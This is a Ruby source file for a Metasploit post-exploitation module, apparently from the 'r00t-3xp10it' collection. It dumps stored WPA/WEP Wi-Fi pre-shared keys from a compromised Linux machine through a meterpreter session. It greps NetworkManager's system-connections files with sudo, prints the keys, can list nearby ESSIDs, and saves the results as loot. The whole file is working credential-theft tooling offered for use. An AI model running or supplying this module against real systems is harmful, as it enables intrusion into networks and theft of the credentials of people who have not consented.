require 'rex'
require 'msf/core'
require 'msf/core/post/common'



#
# Metasploit Class name and includes
#
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System



#
# Building Metasploit/Armitage info GUI/CLI
#
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'ESSID linux credentials dump (wpa/wep)',
                        'Description'   => %q{
                                        This module collects 802-11-Wireless-Security credentials such as Access-Point name and Pre-Shared-Key from your target Linux machine using /etc/NetworkManager/system-connections/ files and displays a list of ESSIDs emitting signal (advanced option). This module also stores the dumped data into msf4/loot folder (advanced option).
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                ],
 
                        'Version'        => '$Revision: 1.6',
                        'DisclosureDate' => 'jun 8 2017',
                        'Platform'       => 'linux',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'true',  # root privs required in non-Kali distros
                        'Targets'        =>
                                [
                                         [ 'Linux' ]
                                ],
                        'DefaultTarget'  => '1', # default its to run againts Kali 2.0
                        'References'     =>
                                [
                                         [ 'URL', 'https://github.com/r00t-3xp10it' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ]
                                ],
			'DefaultOptions' =>
				{
					'SESSION' => '1',   # Default its to run againts session 1
                                        'REMOTE_DIR' => '/etc/NetworkManager/system-connections',
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('DUMP_CREDS', [ false, 'Dump credentials from remote system?', false])
                        ], self.class)

                register_advanced_options(
                        [
                                OptBool.new('STORE_LOOT', [false, 'Store dumped data to msf4/loot folder?', false]),
                                OptBool.new('ESSID_DUMP', [false, 'Display list of ESSIDs emitting signal?', false]),
                                OptString.new('REMOTE_DIR', [ true, 'The default path for network connections'])
                        ], self.class)
 
        end



#
# DUMP WPA/WEP CREDENTIALS FROM TARGET ..
#
def ls_stage1

  rpath = datastore['REMOTE_DIR'] # /etc/NetworkManager/system-connections
  #
  # check for proper config settings enter...
  # to prevent 'unset all' from deleting default options...
  #
  if datastore['DUMP_CREDS'] == 'nil'
    print_error("Options not configurated correctly ..")
    print_warning("Please set DUMP_CREDS option ..")
    return nil
  else
    print_status("Dumping remote wpa/wep credentials ..")
    Rex::sleep(1.0)
  end

    #
    # Check if NetworkManager path exists ..
    #
    if not File.directory?(rpath)
      print_error("Remote path: #{rpath} not found ..")
      print_error("Please set 'REMOTE_DIR' advanced option to point to another path!")
      print_line("")
      return nil
    end

      #
      # Dump wifi credentials and network info from target system (wpa/wep)
      #
      data_dump=''
      wpa_out = cmd_exec("sudo grep psk= #{rpath}/*")
      wep_out = cmd_exec("sudo grep wep-key0= #{rpath}/*")
      # store data in variable (loot funtion)
      data_dump << wpa_out
      data_dump << wep_out
      Rex::sleep(1.0)

        #
        # Display results on screen (wpa|wep) ..
        #
        print_line("")
        print_line("WPA CREDENTIALS:")
        print_line("----------------")
        print_line(wpa_out)
        print_line("")
        Rex::sleep(0.5)
        print_line("WEP CREDENTIALS:")
        print_line("----------------")
        print_line(wep_out)
        print_line("")
        Rex::sleep(0.5)

          #
          # Display remote ESSIDs available ..
          #
          if datastore['ESSID_DUMP'] == true
            # Store interface in use (remote)
            interface = cmd_exec("netstat -r | grep default | awk {'print $8'}")
            # Executing interface scan (essids emitting) nmcli dev wifi list
            current_essid = cmd_exec("iw dev #{interface} scan | grep \"SSID\" | head -1 | awk {'print $2'}")
            essid_out = cmd_exec("nmcli dev wifi list")
            print_line("Current SSID: #{current_essid}")
            print_line("ESSIDs EMITING SIGNAL:")
            print_line("----------------------")
            print_line(essid_out)
            print_line("")
            Rex::sleep(0.5)
            # store dump into a variable
            # to write logfile if selected ..
            data_dump << essid_out
          end

        #
        # Store data to msf loot folder (local) ..
        #
        if datastore['STORE_LOOT'] == true
          print_warning("Credentials stored in: ~/.msf4/loot (folder) ..")
          store_loot("wpa_wep_credentials", "text/plain", session, data_dump, "wpa_wep_dump.txt", "output of wpa/wep dump")
        end

  #
  # error exception funtion
  #
  rescue ::Exception => e
  print_error("Error Running Command: #{e.class} #{e}")
  print_warning("Try to privilege escalation before runing this module ..")
end



#
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
#
def run
  session = client


      # Variable declarations (msf API calls)
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd


    # Print banner and scan results on screen
    print_line("")
    print_line("    +--------------------------------------------+")
    print_line("    |     * ESSID WIFI PASSWORD DUMP LINUX *     |")
    print_line("    |            Author : r00t-3xp10it           |")
    print_line("    +--------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Target Architecture : #{sysnfo['Architecture']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    #
    # the 'def check()' funtion that rapid7 requires to accept new modules.
    # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
    #
    # check for proper operative system (Linux)
    #
    unless sysinfo['OS'] =~ /Linux/ || sysinfo['OS'] =~ /linux/
      print_error("[ABORT]: This module only works againt Linux systems")
      return nil
    end
    #
    # Check if we are running in an higth integrity context (root)
    #
    unless runtor =~ /uid=0/ || runtor =~ /root/
      print_error("[ABORT]: Root access is required ..")
      return nil
    end
    #
    # check for proper session (meterpreter)
    # the non-return of sysinfo command reveals that we are not on a meterpreter session!
    #
    if not sysinfo.nil?
      print_status("Running module against: #{sysnfo['Computer']}")
    else
      print_error("[ABORT]: This module only works in meterpreter sessions!")
      return nil
    end


#
# Selected settings to run
#
      if datastore['DUMP_CREDS']
         ls_stage1
      end
   end
end